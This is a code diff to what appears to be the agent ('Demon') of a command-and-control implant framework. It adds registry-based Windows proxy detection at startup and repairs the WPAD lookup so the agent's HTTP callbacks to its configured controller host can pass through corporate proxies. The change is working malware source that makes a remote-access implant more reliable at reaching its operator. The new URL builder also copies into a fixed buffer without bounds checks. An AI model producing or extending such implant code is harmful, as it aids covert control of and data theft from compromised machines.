@@ -7,6 +7,125 @@
 
 /*!
  * @brief
+ *  Read Windows system proxy settings at agent startup.
+ *
+ *  Primary path: direct Advapi32 registry read of
+ *    HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings
+ *    (ProxyEnable, ProxyServer). No WinHTTP dependency.
+ *
+ *  Secondary path: if no manual registry proxy is found and LookedForProxy
+ *    remains FALSE, the WinHTTP WPAD/IE detection in HttpSend() fires once
+ *    on the first request (guarded by Config.Transport.Proxy.AutoDetect).
+ *
+ *  Called from DemonInit() immediately after DemonConfig() when AutoDetect
+ *  is TRUE. Requires Advapi32 to be loaded (RtAdvapi32() must have run).
+ */
+VOID HttpAutoProxyDetect( VOID )
+{
+    HKEY  hKey           = NULL;
+    DWORD dwType         = 0;
+    DWORD dwProxyEnable  = 0;
+    DWORD dwSize         = sizeof( DWORD );
+    WCHAR ProxyServer[ 512 ]   = { 0 };
+    WCHAR AutoConfigUrl[ 512 ] = { 0 };
+    DWORD cbProxyServer  = sizeof( ProxyServer );
+    DWORD cbAutoConfig   = sizeof( AutoConfigUrl );
+    LONG  Status         = 0;
+
+    HKEY HKCU = (HKEY)(ULONG_PTR) 0x80000001UL; /* HKEY_CURRENT_USER predefined handle */
+
+    PUTS( "[PROXY] AutoDetect: reading HKCU Internet Settings" )
+
+    Status = Instance->Win32.RegOpenKeyExW(
+        HKCU,
+        L"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
+        0,
+        KEY_READ,
+        &hKey
+    );
+    if ( Status != ERROR_SUCCESS ) {
+        PRINTF_DONT_SEND( "[PROXY] RegOpenKeyExW failed: %ld\n", Status )
+        goto LEAVE;
+    }
+
+    /* check ProxyEnable DWORD */
+    dwType = REG_DWORD;
+    dwSize = sizeof( DWORD );
+    if ( Instance->Win32.RegQueryValueExW( hKey, L"ProxyEnable", NULL, &dwType, (PBYTE)&dwProxyEnable, &dwSize ) == ERROR_SUCCESS
+         && dwType == REG_DWORD && dwProxyEnable )
+    {
+        /* manual proxy is set — read the ProxyServer string */
+        dwType       = REG_SZ;
+        cbProxyServer = sizeof( ProxyServer );
+        if ( Instance->Win32.RegQueryValueExW( hKey, L"ProxyServer", NULL, &dwType, (PBYTE)ProxyServer, &cbProxyServer ) == ERROR_SUCCESS
+             && dwType == REG_SZ && StringLengthW( ProxyServer ) > 0 )
+        {
+            /*
+             * ProxyServer may be "host:port" or "http=host:port;https=host:port;..."
+             * Scan for the "http=" entry; fall back to the raw string if not found.
+             */
+            LPWSTR ParsedProxy = ProxyServer;
+            ULONG  PrefixLen   = 5; /* L"http=" */
+
+            for ( LPWSTR p = ProxyServer; *p; p++ ) {
+                if ( StringLengthW( p ) < 5 ) break; /* bounds guard before p[1..4] */
+                if ( p[0] == L'h' && p[1] == L't' && p[2] == L't' && p[3] == L'p' && p[4] == L'=' ) {
+                    LPWSTR HttpEntry = p + PrefixLen;
+                    /* trim at next ';' */
+                    for ( LPWSTR q = HttpEntry; *q; q++ ) {
+                        if ( *q == L';' ) { *q = L'\0'; break; }
+                    }
+                    ParsedProxy = HttpEntry;
+                    break;
+                }
+            }
+
+            /* build full URL: prepend "http://" if the string has no "://" scheme marker */
+            {
+                BOOL  HasScheme  = FALSE;
+                ULONG k;
+                for ( k = 0; k < 10 && ParsedProxy[ k ]; k++ ) {
+                    if ( ParsedProxy[k] == L':' && ParsedProxy[k+1] == L'/' && ParsedProxy[k+2] == L'/' ) {
+                        HasScheme = TRUE;
+                        break;
+                    }
+                }
+
+                DWORD UrlBufChars = StringLengthW( ParsedProxy ) + 8; /* worst case: "http://" + NUL */
+                Instance->Config.Transport.Proxy.Url = MmHeapAlloc( UrlBufChars * sizeof( WCHAR ) );
+
+                if ( HasScheme ) {
+                    MemCopy( Instance->Config.Transport.Proxy.Url, ParsedProxy, StringLengthW( ParsedProxy ) * sizeof( WCHAR ) );
+                } else {
+                    MemCopy( Instance->Config.Transport.Proxy.Url,     L"http://", 7 * sizeof( WCHAR ) );
+                    MemCopy( Instance->Config.Transport.Proxy.Url + 7, ParsedProxy, StringLengthW( ParsedProxy ) * sizeof( WCHAR ) );
+                }
+            }
+
+            Instance->Config.Transport.Proxy.Enabled = TRUE;
+            Instance->LookedForProxy                  = TRUE;
+
+            PRINTF( "[PROXY] Registry proxy: %ls\n", Instance->Config.Transport.Proxy.Url )
+            goto LEAVE;
+        }
+    }
+
+    /* check AutoConfigURL (PAC file) — log only; WinHTTP WPAD in HttpSend() resolves it */
+    dwType     = REG_SZ;
+    cbAutoConfig = sizeof( AutoConfigUrl );
+    if ( Instance->Win32.RegQueryValueExW( hKey, L"AutoConfigURL", NULL, &dwType, (PBYTE)AutoConfigUrl, &cbAutoConfig ) == ERROR_SUCCESS
+         && dwType == REG_SZ && StringLengthW( AutoConfigUrl ) > 0 )
+    {
+        PRINTF( "[PROXY] PAC URL found: %ls (WinHTTP resolves at first connect)\n", AutoConfigUrl )
+        /* LookedForProxy stays FALSE so HttpSend's WinHTTP WPAD block fires once */
+    }
+
+LEAVE:
+    if ( hKey ) Instance->Win32.RegCloseKey( hKey );
+}
+
+/*!
+ * @brief
  *  send a http request
  *
  * @param Send
@@ -170,7 +289,7 @@ BOOL HttpSend(
             }
         }
 
-    } else if ( ! Instance->LookedForProxy ) {
+    } else if ( ! Instance->LookedForProxy && Instance->Config.Transport.Proxy.AutoDetect ) {
         // Autodetect proxy settings using the Web Proxy Auto-Discovery (WPAD) protocol
 
         /*
@@ -180,6 +299,39 @@ BOOL HttpSend(
          *       "can be used as a fall-back mechanism" so we are using it that way
          */
 
+        /* WinHttpGetProxyForUrl requires a full URL (scheme://host:port/path).
+         * Passing only the URI path (HttpEndpoint) causes WPAD/PAC evaluation
+         * to silently fail because there is no host for the script to match against. */
+        WCHAR WpadUrl[ 512 ] = { 0 };
+        WCHAR PortBuf[ 8 ]   = { 0 };
+        {
+            LPWSTR Scheme    = Instance->Config.Transport.Secure ? L"https" : L"http";
+            DWORD  SchemeLen = Instance->Config.Transport.Secure ? 5 : 4;
+            DWORD  HostLen   = StringLengthW( Instance->Config.Transport.Host->Host );
+            DWORD  PathLen   = StringLengthW( HttpEndpoint );
+            DWORD  PortLen   = 0;
+            DWORD  Offset    = 0;
+            WORD   Port      = (WORD) Instance->Config.Transport.Host->Port;
+
+            /* WORD → wide decimal string without stdlib */
+            if ( Port == 0 ) {
+                PortBuf[ 0 ] = L'0'; PortLen = 1;
+            } else {
+                WCHAR tmp[ 6 ] = { 0 };
+                DWORD i        = 5;
+                WORD  p        = Port;
+                while ( p > 0 ) { tmp[ --i ] = L'0' + (p % 10); p /= 10; }
+                while ( tmp[ i ] ) { PortBuf[ PortLen++ ] = tmp[ i++ ]; }
+            }
+
+            MemCopy( WpadUrl + Offset, Scheme,                                SchemeLen * sizeof(WCHAR) ); Offset += SchemeLen;
+            MemCopy( WpadUrl + Offset, L"://",                                3         * sizeof(WCHAR) ); Offset += 3;
+            MemCopy( WpadUrl + Offset, Instance->Config.Transport.Host->Host, HostLen   * sizeof(WCHAR) ); Offset += HostLen;
+            WpadUrl[ Offset++ ] = L':';
+            MemCopy( WpadUrl + Offset, PortBuf,      PortLen * sizeof(WCHAR) ); Offset += PortLen;
+            MemCopy( WpadUrl + Offset, HttpEndpoint, PathLen * sizeof(WCHAR) );
+        }
+
         AutoProxyOptions.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
         AutoProxyOptions.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
         AutoProxyOptions.lpszAutoConfigUrl      = NULL;
@@ -187,7 +339,7 @@ BOOL HttpSend(
         AutoProxyOptions.dwReserved             = 0;
         AutoProxyOptions.fAutoLogonIfChallenged = TRUE;
 
-        if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) ) {
+        if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, WpadUrl, &AutoProxyOptions, &ProxyInfo ) ) {
             if ( ProxyInfo.lpszProxy ) {
                 PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
             }
@@ -221,7 +373,7 @@ BOOL HttpSend(
 
                     PRINTF_DONT_SEND( "Trying to discover the proxy config via the config url %ls\n", AutoProxyOptions.lpszAutoConfigUrl );
 
-                    if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) ) {
+                    if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, WpadUrl, &AutoProxyOptions, &ProxyInfo ) ) {
                         if ( ProxyInfo.lpszProxy ) {
                             PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
                         }
